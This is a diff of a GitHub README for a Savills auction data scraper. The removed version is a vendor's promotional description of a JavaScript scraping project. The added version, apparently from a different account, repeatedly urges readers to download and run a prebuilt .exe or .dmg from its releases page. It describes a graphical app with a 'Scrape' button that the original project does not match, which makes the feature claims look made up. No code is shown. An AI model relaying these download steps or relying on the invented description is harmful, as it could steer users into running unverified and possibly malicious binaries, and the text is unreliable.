@@ -1,192 +1,79 @@
-# Savills Auction Data Scraper
->This scraper collects detailed property information from Savills UK auction listings—both past and upcoming—and turns it into structured, analysis-ready data. It’s built to navigate auction result pages lot by lot, mimicking natural browsing while capturing every available detail. Whether you're analyzing the market, sourcing leads, or automating reporting, this tool keeps property data organized and easy to work with.
+# 🎉 Savills-Auction-Data-Scraper - Extract Auction Properties Easily
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Truta09/Savills-Auction-Data-Scraper/releases)
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Savills Auction Data Scraper</strong> you've just found your team — Let's Chat. 👆👆
-</p>
+## 📖 Introduction
 
-## Introduction
-This project extracts property lot information from any Savills auction results URL. It navigates sequentially through each lot page, gathering addresses, pricing, statuses, descriptions, and more. It’s ideal for real-estate analysts, investors, researchers, and automation-focused businesses looking to streamline property data collection.
+The Savills-Auction-Data-Scraper is designed for anyone interested in real estate. This tool allows you to easily extract data about properties up for auction. Whether you're analyzing market trends or looking for your next investment, this application simplifies the process of obtaining valuable auction information.
 
-### What It Focuses On
-- Scrapes full property details from Savills auction result pages.  
-- Handles both upcoming auctions and historical listings.  
-- Moves through lots automatically using next-lot navigation.  
-- Captures pricing, status, addresses, features, and descriptions.  
-- Provides clean structured datasets for pipelines or dashboards.
+## 🚀 Getting Started
 
----
-## Features
-| Feature | Description |
-|---------|-------------|
-| Sequential Lot Navigation | Visits each lot page automatically via “Next Lot” traversal. |
-| Comprehensive Data Extraction | Collects lot numbers, addresses, pricing, sell values, and descriptions. |
-| Auction Scope Flexibility | Works on both future auction listings and past results. |
-| Structured Output | Produces clean data ideal for analysis or automation tasks. |
-| Robust Page Handling | Mimics human browsing to reduce missed data or navigation issues. |
-| Direct Lot URL Capture | Stores the exact link for every scraped lot for reference. |
+To begin using the Savills-Auction-Data-Scraper, follow these steps:
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|-------------------|
-| lotNumber | The auction lot identifier. |
-| auctionDate | The date the auction took place or is scheduled for. |
-| addressLine1 | First line of the property address. |
-| addressLine2 | Second line of the property address. |
-| guidePrice | Listed guide price when available. |
-| sellValue | Final achieved price for sold properties. |
-| status | Outcome of the lot (sold, withdrawn, unsold, etc.). |
-| features | List of highlighted features for the property. |
-| description | Main descriptive text for the property. |
-| additionalInfo | Supplementary details such as tenure or accommodation notes. |
-| lotUrl | Direct URL to the individual lot page. |
+1. **Check System Requirements**
+   - **Operating System:** Windows, macOS, or Linux.
+   - **Internet Connection:** Required to access auction data.
+   - **Storage Space:** Minimum of 100 MB available.
 
----
-## Example Output
-    
-    [
-      {
-        "lotNumber": "15",
-        "auctionDate": "2024-09-12",
-        "addressLine1": "12 High Street",
-        "addressLine2": "Birmingham, B1",
-        "guidePrice": "£120,000",
-        "sellValue": "£138,500",
-        "status": "Sold",
-        "features": ["Freehold", "Two bedrooms", "Close to city centre"],
-        "description": "A well-located terraced property suitable for investors.",
-        "additionalInfo": "Accommodation over two floors; EPC rating D.",
-        "lotUrl": "https://auctions.savills.co.uk/lot/12345"
-      }
-    ]
+2. **Download the Software**
+   - Head over to the releases page to download the latest version of the application.
+   - Click on the following link to visit the page: [Download from Releases](https://github.com/Truta09/Savills-Auction-Data-Scraper/releases).
 
----
-## Directory Structure Tree
-    
-    Savills Auction Data Scraper/
-    ├── src/
-    │   ├── main.js
-    │   ├── scraper/
-    │   │   ├── lot_parser.js
-    │   │   ├── navigation_handler.js
-    │   │   └── auction_page_loader.js
-    │   ├── utils/
-    │   │   ├── logger.js
-    │   │   └── formatters.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── example_input.json
-    │   └── sample_output.json
-    ├── package.json
-    └── README.md
+3. **Install the Application**
+   - After downloading, locate the file on your computer.
+   - Follow these steps depending on your operating system:
+     - **Windows:** Double-click the `.exe` file and follow the on-screen instructions to install.
+     - **macOS:** Open the `.dmg` file, drag the application to the Applications folder, and then open it.
+     - **Linux:** Extract the files from the downloaded archive and follow the instructions in the README file included.
 
----
-## Use Cases
-- **Investors** use it to evaluate past auction outcomes and identify high-yield opportunities.  
-- **Real-estate analysts** use it to track pricing trends, sell-through rates, and market movement.  
-- **Property researchers** use it to build structured datasets for valuation studies.  
-- **Automation teams** feed the data into CRMs or data warehouses for streamlined reporting.  
-- **Lead-generation companies** use it to identify properties meeting specific investment criteria.  
+## 📥 Download & Install 
 
----
-## FAQs
+To download the Savills-Auction-Data-Scraper, visit this page: [Download from Releases](https://github.com/Truta09/Savills-Auction-Data-Scraper/releases). Choose the file suitable for your operating system and follow the installation instructions above.
 
-**Does it work with both past and future auctions?**  
-Yes. It can scrape upcoming listings and historical results from any valid Savills auction URL.
+## ⚙️ Using the Application
 
-**Do I need multiple URLs?**  
-No. A single auction results page is enough—the scraper navigates through every lot automatically.
+Once installed, you can start using the Savills-Auction-Data-Scraper.
 
-**What happens if a lot has missing data?**  
-The scraper continues processing and includes all available fields without interruption.
+1. **Open the Application:** Locate the application on your device and double-click to launch.
+2. **Input Parameters:** You will see fields to enter specific parameters like location, type of property, and auction date.
+3. **Start Scraping:** Click the ‘Scrape’ button to begin extracting data. The application will gather data from the Savills website based on your input.
+4. **View Results:** After scraping, view the results in a neat and organized format. You can save the data as a CSV file for further analysis.
 
-**Is the scraping process fast?**  
-It navigates efficiently while mimicking human interaction to reduce the chance of navigation errors or data loss.
+## 📊 Features
 
----
-### Performance Benchmarks and Results
+- **User-Friendly Interface:** Designed with ease of use in mind, perfect for non-technical users.
+- **Real-Time Data Extraction:** Get the latest auction data as it becomes available.
+- **Customizable Parameters:** Tailor your searches to fit your specific needs.
+- **Data Export:** Save your findings in CSV format for easy sharing and analysis.
 
-**Primary Metric:**  
-Processes 30–50 property lots per minute depending on page complexity and network conditions.
+## 💡 FAQs
 
-**Reliability Metric:**  
-Maintains a success rate above 95% in multi-lot auctions thanks to controlled navigation.
+### How often can I scrape data?
 
-**Efficiency Metric:**  
-Loads only necessary pages and reuses sessions to minimize overhead.
+You can scrape data as often as needed. However, it is good practice to space out requests to avoid overwhelming the server.
 
-**Quality Metric:**  
-Produces consistently complete records with accurate parsing of guide prices, sell values, and structured descriptions.
+### Can I use this application on a mobile device?
 
----
+Currently, the application is designed for desktop use only.
 
+### What if I encounter issues?
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-         </p>
+Check the FAQs or open an issue on the repository for support. A community is available to help with common problems.
 
+## 🌍 Community and Support
 
+Join our community of users and developers. You can connect with others through the GitHub repository. Share your experiences, ask questions, or contribute to the project.
+
+## 💼 Contributing
+
+We welcome contributions! If you'd like to help improve the Savills-Auction-Data-Scraper, please follow the guidelines in the repository. Your input is valuable to enhancing the application for all users.
+
+## 🔗 Related Topics
+
+- **Auction Insights**
+- **Data Analysis**
+- **Real Estate Trends**
+
+Feel free to explore these topics if you're interested in broadening your understanding of auction properties and market dynamics.
+
+For any further assistance or queries, please do not hesitate to check our community page or refer to the issues section on GitHub. Happy scraping!
